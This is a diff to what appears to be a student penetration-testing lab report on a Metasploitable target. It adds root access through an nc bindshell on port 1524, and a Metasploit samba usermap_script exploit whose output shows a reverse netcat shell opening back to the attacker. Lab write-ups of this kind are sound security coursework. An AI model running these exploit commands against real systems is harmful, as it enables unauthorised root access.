@@ -59,14 +59,51 @@ Nmap done: 1 IP address (1 host up) scanned in 142.24 seconds
     ...
     ```
 
-    We can use `nc` to get the root priviliege:
+    We can use `nc` to get the root access:
 
     ```bash
     ┌──(alonza㉿kali)-[~]
     └─$ nc 172.16.0.38 1524
-    root@metasploitable:/# sudo echo
+    root@metasploitable:/# whoami
+    root
+    ```
 
-    root@metasploitable:/# 
+2. Method 2
+
+    Target port:
+
+    ```bash
+    ...
+    139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+    445/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+    ...
+    ```
+
+    Start exploit:
+
+    ```bash
+    msfconsole
+    ```
+
+    ```bash
+    use exploit/multi/samba/usermap_script
+    set RHOSTS 192.168.0.156
+    run
+    ```
+
+    Then get:
+
+    ```bash
+    msf > use exploit/multi/samba/usermap_script
+    [*] No payload configured, defaulting to cmd/unix/reverse_netcat
+    msf exploit(multi/samba/usermap_script) >     set RHOSTS 192.168.0.156
+    RHOSTS => 192.168.0.156
+    msf exploit(multi/samba/usermap_script) >     run
+    [*] Started reverse TCP handler on 192.168.0.155:4444 
+    [*] Command shell session 1 opened (192.168.0.155:4444 -> 192.168.0.156:57131) at 2025-11-25 00:24:11 -1000
+
+    whoami
+    root
     ```
 
 ## L1 (Normal) - 172.16.0.74
@@ -208,7 +245,7 @@ Nmap done: 1 IP address (1 host up) scanned in 190.14 seconds
 | Student ID | Works | Percentage |
 | - | - | - |
 | 314581015 | L0-M1 | 20% |
-| 313581047 | L2-M1 | 20% |
+| 313581047 | L0-M2, L2-M1 | 20% |
 | 313581038 | scanning & research | 20% |
 | 313581055 | scanning & research | 20% |
 | 412581005 | scanning & research | 20% |
